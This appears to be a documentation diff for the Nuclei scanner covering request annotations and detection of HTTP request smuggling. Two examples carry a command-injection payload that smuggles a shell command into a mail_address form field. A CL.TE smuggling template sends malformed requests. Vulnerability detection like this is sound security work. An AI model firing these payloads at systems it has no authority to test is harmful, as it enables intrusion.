@@ -1,3 +1,130 @@
 ---
 title: 'Request Tampering'
 ---
+
+## Requests Annotation
+
+Request inline annotations allow performing per request properties/behavior override. They are very similar to python/java class annotations and must be put on the request just before the RFC line. Currently, only the following overrides are supported:
+
+- `@Host:` which overrides the real target of the request (usually the host/ip provided as input). It supports syntax with ip/domain, port, and scheme, for example: `domain.tld`, `domain.tld:port`, `http://domain.tld:port`
+- `@tls-sni:` which overrides the SNI Name of the TLS request (usually the hostname provided as input). It supports any literals. The special value `request.host` uses the `Host` header and `interactsh-url` uses an interactsh generated URL.
+- `@timeout:` which overrides the timeout for the request to a custom duration. It supports durations formatted as string. If no duration is specified, the default Timeout flag value is used.
+
+The following example shows the annotations within a request:
+
+```yaml
+- |
+  @Host: https://projectdiscovery.io:443
+  POST / HTTP/1.1
+  Pragma: no-cache
+  Host: {{Hostname}}
+  Cache-Control: no-cache, no-transform
+  User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
+```
+This is particularly useful, for example, in the case of templates with multiple requests, where one request after the initial one needs to be performed to a specific host (for example, to check an API validity):
+
+```yaml
+http:
+  - raw:
+      # this request will be sent to {{Hostname}} to get the token
+      - |
+        GET /getkey HTTP/1.1
+        Host: {{Hostname}}
+        
+      # This request will be sent instead to https://api.target.com:443 to verify the token validity
+      - |
+        @Host: https://api.target.com:443
+        GET /api/key={{token}} HTTP/1.1
+        Host: api.target.com:443
+
+    extractors:
+      - type: regex
+        name: token
+        part: body
+        regex:
+          # random extractor of strings between prefix and suffix
+          - 'prefix(.*)suffix'
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - valid token
+```
+
+Example of a custom `timeout` annotations - 
+
+```yaml
+- |
+  @timeout: 25s
+  POST /conf_mail.php HTTP/1.1
+  Host: {{Hostname}}
+  Content-Type: application/x-www-form-urlencoded
+  
+  mail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M
+```
+
+Example of `sni` annotation with `interactsh-url` - 
+
+```yaml
+- |
+  @tls-sni: interactsh-url
+  POST /conf_mail.php HTTP/1.1
+  Host: {{Hostname}}
+  Content-Type: application/x-www-form-urlencoded
+  
+  mail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M
+```
+
+## Smuggling
+
+HTTP Smuggling is a class of Web-Attacks recently made popular by [Portswigger’s Research](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) into the topic. For an in-depth overview, please visit the article linked above.
+
+In the open source space, detecting http smuggling is difficult particularly due to the requests for detection being malformed by nature. Nuclei is able to reliably detect HTTP Smuggling vulnerabilities utilising the [rawhttp](https://github.com/projectdiscovery/rawhttp) engine.
+
+The most basic example of an HTTP Smuggling vulnerability is CL.TE Smuggling. An example template to detect a CE.TL HTTP Smuggling vulnerability is provided below using the `unsafe: true` attribute for rawhttp based requests.
+
+```yaml
+id: CL-TE-http-smuggling
+
+info:
+  name: HTTP request smuggling, basic CL.TE vulnerability
+  author: pdteam
+  severity: info
+  reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
+
+http:
+  - raw:
+    - |+
+      POST / HTTP/1.1
+      Host: {{Hostname}}
+      Connection: keep-alive
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 6
+      Transfer-Encoding: chunked
+      
+      0
+      
+      G      
+    - |+
+      POST / HTTP/1.1
+      Host: {{Hostname}}
+      Connection: keep-alive
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 6
+      Transfer-Encoding: chunked
+      
+      0
+      
+      G
+            
+    unsafe: true
+    matchers:
+      - type: word
+        words:
+          - 'Unrecognized method GPOST'
+```
+
+<Tip>
+More complete examples are provided [here](/templates/protocols/http/http-smuggling-examples)
+</Tip>
